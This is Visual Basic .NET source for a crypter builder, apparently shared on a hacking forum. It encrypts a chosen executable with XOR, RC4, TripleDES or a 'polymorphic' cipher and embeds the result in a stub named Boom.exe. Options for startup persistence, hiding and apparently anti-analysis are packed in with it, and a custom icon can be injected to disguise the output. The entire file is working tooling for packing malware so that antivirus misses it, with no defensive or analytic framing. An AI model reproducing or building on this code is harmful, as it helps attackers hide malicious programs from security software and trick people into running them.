Imports System.Text
Imports System.Security.Cryptography
Public Class Form1
    Const Kokrra = "JHqd2ed9"
 Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Executable Files|*.exe"
        If Open.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBox1.Text = Open.FileName
        Else : Exit Sub
        End If
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim sfd1 As New SaveFileDialog
        sfd1.DefaultExt = "exe"
        sfd1.Filter = "Executable Files (*.Exe)|*.Exe"
        If sfd1.ShowDialog = Windows.Forms.DialogResult.OK Then
        End If
        Dim filein As String
        Dim something As String = TextBox2.Text
        Dim fstart, hide1, ant As String

        Try
            If CheckBox1.Checked = True Then
                fstart = "True"
            Else
                fstart = "False"
            End If
            If CheckBox2.Checked = True Then
                hide1 = "True"
            Else
                hide1 = "False"
            End If
            If CheckBox3.Checked = True Then
                ant = "True"
            Else
                ant = "False"
            End If

            FileOpen(1, TextBox1.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            filein = Space(LOF(1))
            FileGet(1, filein)
            FileClose(1)
           
            IO.File.Copy(Application.StartupPath & "\Boom.exe", sfd1.FileName)
            Dim BuildString As String
            If RadioButton1.Checked Then
                Dim custom = "Proto"
                BuildString = Kokrra & Encoding.Default.GetString(encrypt1(Encoding.Default.GetBytes(filein), something)) & Kokrra & custom & Kokrra & something & Kokrra & fstart & Kokrra & hide1 & Kokrra & ant
            ElseIf RadioButton2.Checked Then
                Dim custom = "RC4"
                BuildString = Kokrra & Encoding.Default.GetString(RC4(Encoding.Default.GetBytes(filein), Encoding.Default.GetBytes(something))) & Kokrra & custom & Kokrra & something & Kokrra & fstart & Kokrra & hide1 & Kokrra & ant
            ElseIf RadioButton3.Checked Then
                Dim custom = "TripleDES"
                BuildString = Kokrra & Encrypt(filein, something, True) & Kokrra & custom & Kokrra & something & Kokrra & fstart & Kokrra & hide1 & Kokrra & ant
            ElseIf RadioButton4.Checked Then
                Dim custom = "XOR"

                BuildString = Kokrra & DXOR(filein, something, 8) & Kokrra & custom & Kokrra & something & Kokrra & fstart & Kokrra & hide1 & Kokrra & ant
            Else
                Dim custom = "Stairs"
                BuildString = Kokrra & PolyMorphicStairs.PolyCrypt(filein, something, 8) & Kokrra & custom & Kokrra & something & Kokrra & fstart & Kokrra & hide1 & Kokrra & ant
            End If
            Dim StringtoByte As Byte() = Encoding.Default.GetBytes(BuildString)
            ResourceWriter.WriteResource(sfd1.FileName, StringtoByte)

            If TextBox3.Text = "" Then
            Else
                IconChanger.InjectIcon(sfd1.FileName, TextBox3.Text)
            End If
        Catch ex As Exception

        End Try
        MsgBox("done")
    End Sub
    Private Function DXOR(ByVal input As String, ByVal key As String, ByVal amount As Integer) As String
        'By d3c0mpil3r from hackforums.
        'Remember : A "Thanks" is always appreciated.
        Dim b1, b2 As Byte()
        b1 = System.Text.Encoding.Default.GetBytes(input)
        b2 = System.Text.Encoding.Default.GetBytes(key)
        For i = 0 To b1.Length - 1
            b1(i) = b1(i) Xor (b2(i Mod b2.Length) << (i + amount + b2.Length)) And 255
        Next
        Return System.Text.Encoding.Default.GetString(b1)
    End Function
   

    
    Private Shared Function RC4(ByVal Input As Byte(), ByVal Key As Byte()) As Byte()
        'Leave a thanks at least..
        'by d3c0mpil3r from HF
        Dim i, j, swap As UInteger
        Dim s As UInteger() = New UInteger(255) {}
        Dim Output As Byte() = New Byte(Input.Length - 1) {}

        For i = 0 To 255
            s(i) = i
        Next

        For i = 0 To 255
            j = (j + Key(i Mod Key.Length) + s(i)) And 255
            swap = s(i) 'Swapping of s(i) and s(j)
            s(i) = s(j)
            s(j) = swap
        Next

        i = 0 : j = 0
        For c = 0 To Output.Length - 1
            i = (i + 1) And 255
            j = (j + s(i)) And 255
            swap = s(i) 'Swapping of s(i) and s(j)
            s(i) = s(j)
            s(j) = swap
            Output(c) = Input(c) Xor s((s(i) + s(j)) And 255)
        Next

        Return Output
    End Function
    Public Shared Function Encrypt(ByVal toEncrypt As String, ByVal key As String, ByVal useHashing As Boolean) As String
        Dim keyArray As Byte()
        Dim toEncryptArray As Byte() = UTF8Encoding.UTF8.GetBytes(toEncrypt)
        If useHashing Then
            Dim hashmd5 As New MD5CryptoServiceProvider()
            keyArray = hashmd5.ComputeHash(UTF8Encoding.UTF8.GetBytes(key))
        Else
            keyArray = UTF8Encoding.UTF8.GetBytes(key)
        End If
        Dim tdes As New TripleDESCryptoServiceProvider()
        tdes.Key = keyArray
        tdes.Mode = CipherMode.ECB
        tdes.Padding = PaddingMode.PKCS7
        Dim cTransform As ICryptoTransform = tdes.CreateEncryptor()
        Dim resultArray As Byte() = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length)
        Return Convert.ToBase64String(resultArray, 0, resultArray.Length)
    End Function
    Public Function encrypt1(ByVal message As Byte(), ByVal password As String) As Byte()
        Dim passarr As Byte() = System.Text.Encoding.Default.GetBytes(password)
        Randomize()
        Dim rand As Integer = Int((255 - 0 + 1) * Rnd()) + 1
        Dim outarr(message.Length) As Byte
        Dim u As Integer
        For i As Integer = 0 To message.Length - 1
            outarr(i) += (message(i) Xor passarr(u)) Xor rand
            If u = password.Length - 1 Then u = 0 Else u = u + 1
        Next
        outarr(message.Length) = 112 Xor rand
        Return outarr
    End Function
    Public Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        TextBox2.Text = random_key(10)
    End Sub
    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        Dim icoana As New OpenFileDialog
        icoana.DefaultExt = "ico"
        icoana.Filter = "Icon Files (*.ico*)|*.ico*"
        icoana.FilterIndex = 1
        icoana.FileName = ""
        If icoana.ShowDialog(Me) = 1 Then
            TextBox3.Text = icoana.FileName
        End If
        TextBox3.Text = icoana.FileName
        Dim i As New Icon(icoana.FileName)
        Dim b As New Bitmap(i.ToBitmap)
        PictureBox1.Image = b
    End Sub
   Private Sub CheckBox4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked Then
            Button4.Enabled = True
        Else
            Button4.Enabled = False
        End If
        If CheckBox4.Checked = True Then TextBox3.Enabled = True : Button4.Enabled = True
        If CheckBox4.Checked = False Then TextBox3.Enabled = False : Button4.Enabled = False
    End Sub
End Class
Public Class PolyMorphicStairs
    Overloads Shared Function PolyCrypt(ByVal Data As String, ByVal Key As String, Optional ByVal ExtraRounds As UInteger = 0) As String
        Dim buff() As Byte = PolyCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(Key), ExtraRounds)
        PolyCrypt = Encoding.Default.GetString(buff)
        Erase buff
    End Function
    Overloads Shared Function PolyDeCrypt(ByVal Data As String, ByVal Key As String, Optional ByVal ExtraRounds As UInteger = 0) As String
        Dim buff() As Byte = PolyDeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(Key), ExtraRounds)
        PolyDeCrypt = Encoding.Default.GetString(buff)
        Erase buff
    End Function
    Overloads Shared Function PolyCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
        Array.Resize(Data, Data.Length + 1)
        Data(Data.Length - 1) = Convert.ToByte(New Random().Next(1, 255))
        For i = (Data.Length - 1) * (ExtraRounds + 1) To 0 Step -1
            Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor Key(i Mod Key.Length)
        Next
        Return Data
    End Function
    Overloads Shared Function PolyDeCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
        For i = 0 To (Data.Length - 1) * (ExtraRounds + 1)
            Data(i Mod Data.Length) = CByte((CInt(Data(i Mod Data.Length) Xor Key(i Mod Key.Length)) - CInt(Data((i + 1) Mod Data.Length)) + 256) Mod 256)
        Next
        Array.Resize(Data, Data.Length - 1)
        Return Data
    End Function
End Class